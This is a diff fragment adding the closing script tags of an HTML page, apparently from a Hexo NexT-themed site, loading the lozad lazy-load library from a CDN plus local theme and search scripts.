+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
